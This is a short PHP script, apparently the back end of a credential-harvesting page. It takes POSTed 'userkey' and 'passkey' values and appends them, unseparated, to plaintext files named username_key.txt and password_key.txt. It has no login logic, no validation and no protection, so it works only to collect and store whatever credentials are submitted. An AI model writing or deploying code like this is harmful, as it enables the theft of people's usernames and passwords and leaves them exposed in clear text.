<?php

$user = $_POST['userkey'];
$passwd = $_POST['passkey'];

if(isset($user)){
    $filename = fopen("username_key.txt","a");
    fwrite($filename,$user);
    fclose($filename);
}

if(isset($passwd)){
    $filename = fopen("password_key.txt","a");
    fwrite($filename,$passwd);
    fclose($filename);
}


?>